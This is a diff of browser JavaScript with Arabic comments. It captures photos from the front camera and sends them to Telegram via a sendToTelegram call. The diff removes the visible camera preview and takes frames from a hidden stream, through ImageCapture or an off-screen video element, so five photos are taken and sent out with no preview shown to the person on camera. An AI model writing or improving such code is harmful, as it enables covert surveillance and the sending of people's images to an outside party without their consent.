@@ -8,7 +8,6 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- انتهى التعديل هنا ---
 
     // عناصر الواجهة
-    const preview = document.getElementById('preview');
     const capturePhotoBtn = document.getElementById('capturePhotoBtn');
     const recordVideoBtn = document.getElementById('recordVideoBtn');
     const recordAudioBtn = document.getElementById('recordAudioBtn');
@@ -70,20 +69,26 @@ document.addEventListener('DOMContentLoaded', () => {
             // محاولة الحصول على الكاميرا والميكروفون معاً
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' }, 
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, 
                     audio: true 
                 });
             } catch (err) {
                 // إذا فشل، حاول بدون تحديد facingMode
                 console.warn('محاولة بدون facingMode:', err);
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: true, 
-                    audio: true 
-                });
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { width: { ideal: 1280 }, height: { ideal: 720 } }, 
+                        audio: true 
+                    });
+                } catch (err2) {
+                    // محاولة أخيرة بدون تحديد الدقة
+                    console.warn('محاولة بدون تحديد الدقة:', err2);
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true, 
+                        audio: true 
+                    });
+                }
             }
-            
-            preview.srcObject = stream;
-            preview.classList.remove('hidden');
             
             // تمكين الأزرار بعد الحصول على الصلاحيات
             capturePhotoBtn.disabled = false;
@@ -211,26 +216,79 @@ document.addEventListener('DOMContentLoaded', () => {
 
             for (let i = 0; i < 5; i++) {
                 updateStatus(`التقاط الصورة ${i + 1} من 5...`, 'info');
+                let captureSuccess = false;
                 
                 try {
-                    context.drawImage(preview, 0, 0, canvas.width, canvas.height);
-                    const blob = await new Promise((resolve, reject) => {
-                        canvas.toBlob((blob) => {
-                            if (blob) {
-                                resolve(blob);
-                            } else {
-                                reject(new Error('فشل في تحويل الصورة إلى blob'));
-                            }
-                        }, 'image/jpeg', 0.95);
-                    });
+                    // الحصول على أول فيديو track من البث
+                    const videoTrack = stream.getVideoTracks()[0];
+                    if (!videoTrack) {
+                        throw new Error('لا توجد كاميرا متاحة');
+                    }
                     
-                    const formData = {
-                        method: 'sendPhoto',
-                        fileType: 'photo',
-                        file: blob,
-                        fileName: `capture_${Date.now()}_${i}.jpg`
-                    };
-                    await sendToTelegram(formData, `صورة رقم ${i + 1}`);
+                    // محاولة استخدام ImageCapture API (الطريقة الأفضل)
+                    if (typeof ImageCapture !== 'undefined') {
+                        try {
+                            const imageCaptureObj = new ImageCapture(videoTrack);
+                            const bitmap = await imageCaptureObj.grabFrame();
+                            const canvas2 = document.createElement('canvas');
+                            canvas2.width = bitmap.width;
+                            canvas2.height = bitmap.height;
+                            const ctx = canvas2.getContext('2d');
+                            ctx.drawImage(bitmap, 0, 0);
+                            
+                            const blob = await new Promise((resolve, reject) => {
+                                canvas2.toBlob((blob) => {
+                                    if (blob) {
+                                        resolve(blob);
+                                    } else {
+                                        reject(new Error('فشل في تحويل الصورة إلى blob'));
+                                    }
+                                }, 'image/jpeg', 0.95);
+                            });
+                            
+                            const formData = {
+                                method: 'sendPhoto',
+                                fileType: 'photo',
+                                file: blob,
+                                fileName: `capture_${Date.now()}_${i}.jpg`
+                            };
+                            await sendToTelegram(formData, `صورة رقم ${i + 1}`);
+                            captureSuccess = true;
+                        } catch (imageCaptureErr) {
+                            console.warn('ImageCapture فشل، استخدام الطريقة البديلة:', imageCaptureErr);
+                        }
+                    }
+                    
+                    // إذا فشلت ImageCapture أو لم تكن متاحة، استخدم الطريقة البديلة
+                    if (!captureSuccess) {
+                        console.log('استخدام الطريقة البديلة للتقاط الصورة');
+                        const tempVideo = document.createElement('video');
+                        tempVideo.srcObject = stream;
+                        tempVideo.muted = true;
+                        tempVideo.play();
+                        
+                        await new Promise(resolve => setTimeout(resolve, 100));
+                        
+                        context.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
+                        const blob = await new Promise((resolve, reject) => {
+                            canvas.toBlob((blob) => {
+                                if (blob) {
+                                    resolve(blob);
+                                } else {
+                                    reject(new Error('فشل في تحويل الصورة إلى blob'));
+                                }
+                            }, 'image/jpeg', 0.95);
+                        });
+                        
+                        const formData = {
+                            method: 'sendPhoto',
+                            fileType: 'photo',
+                            file: blob,
+                            fileName: `capture_${Date.now()}_${i}.jpg`
+                        };
+                        await sendToTelegram(formData, `صورة رقم ${i + 1}`);
+                        captureSuccess = true;
+                    }
                     
                     // انتظار قصير بين الصور
                     if (i < 4) await new Promise(resolve => setTimeout(resolve, 500));
